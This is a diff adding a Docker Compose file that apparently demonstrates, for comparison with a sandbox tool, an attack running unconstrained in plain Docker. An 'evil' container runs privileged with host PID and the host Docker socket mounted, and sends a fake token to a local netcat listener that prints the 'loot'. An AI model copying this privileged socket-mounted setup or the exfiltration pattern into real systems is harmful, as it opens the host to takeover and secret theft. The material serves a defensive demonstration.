@@ -1,0 +1,22 @@
+# The same attack in plain Docker, for comparison. Nothing contains it: every
+# send goes to `attacker`, a listener on this machine, which prints the loot.
+#   docker compose -f without-secbox.yaml up --build
+services:
+  api:
+    build: ./api
+    environment:
+      DEMO_TOKEN: demo_FAKE_ghp_TOKEN_not_real_123456
+      ATTACKER_URL: http://attacker:8000
+  evil:
+    build: ./evil
+    privileged: true
+    pid: host
+    environment:
+      ATTACKER_URL: http://attacker:8000
+    volumes:
+      - /run:/vm-run
+      - /var/run/docker.sock:/var/run/docker.sock
+  attacker:
+    image: alpine:3.20
+    # Answers every request with an empty 200, and prints what it was sent.
+    command: ["sh", "-c", "while true; do printf 'HTTP/1.0 200 OK\\r\\nContent-Length: 0\\r\\n\\r\\n' | nc -l -p 8000 -w 2 | grep -aE '^(POST|[A-Za-z0-9+/=_]{12,})' | sed 's/^/ATTACKER GOT: /'; done"]
